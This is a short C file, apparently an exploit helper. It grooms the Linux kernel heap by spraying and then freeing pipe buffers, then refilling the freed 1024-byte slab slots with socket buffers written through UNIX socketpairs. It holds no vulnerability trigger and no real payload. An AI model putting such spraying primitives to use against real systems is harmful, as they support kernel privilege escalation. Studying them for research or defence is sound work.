#include <unistd.h>
#include <sys/socket.h>

size_t buf[0x100];
#define pipe_buf_spray 0x100
int pipe_bufs[pipe_buf_spray][2];
void spray_pipe_bufs() {
  for (int i = 0; i < pipe_buf_spray; i++) {
    pipe(pipe_bufs[i]);
    write(pipe_bufs[i][1], &buf[0], 0x8);
  }
}


void close_pipe_bufs() {
  for (int i = 0; i < pipe_buf_spray; i++) {
    close(pipe_bufs[i][0]);
    close(pipe_bufs[i][1]);
  }
}

#define sk_buff_spray 0x100
int sk_buffs[sk_buff_spray][2];
size_t target_size = 1024;
void spray_sk_buff() {
  char payload[target_size - 320];
  for (int i = 0; i < sk_buff_spray; i++) {
    socketpair(AF_UNIX, SOCK_STREAM, 0, sk_buffs[i]);
    write(sk_buffs[i][0], payload, sizeof(payload));
  }
}

int main() {
  spray_pipe_bufs();
  close_pipe_bufs();
  spray_sk_buff();
}
